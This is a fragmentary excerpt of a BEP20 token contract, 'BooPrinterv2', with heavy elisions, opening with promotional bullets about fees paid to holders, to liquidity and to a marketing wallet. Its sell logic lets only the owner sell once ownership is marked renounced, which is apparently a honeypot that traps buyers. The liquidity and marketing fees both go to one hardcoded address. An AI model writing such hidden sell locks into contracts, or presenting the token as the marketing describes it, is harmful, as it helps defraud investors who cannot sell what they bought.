...
👉🏻10% of each transaction goes back to BOOP token holders in the form of BOO,

 👉🏻2% of each transaction is added to liquidity

 👉🏻2% is deposited to the marketing wallet.
...
contract BooPrinterv2 is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "BooPrinterv2";
    string constant _symbol = "BooPrinterv2";
    ...
    address public autoLiquidityReceiver=0x7116C86BE754f5607f5f8616476020d40F40d06E; 
    address public marketingFeeReceiver=0x7116C86BE754f5607f5f8616476020d40F40d06E; 
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!OwnershipRenounced || sender==owner), "Ownership is already renounced");
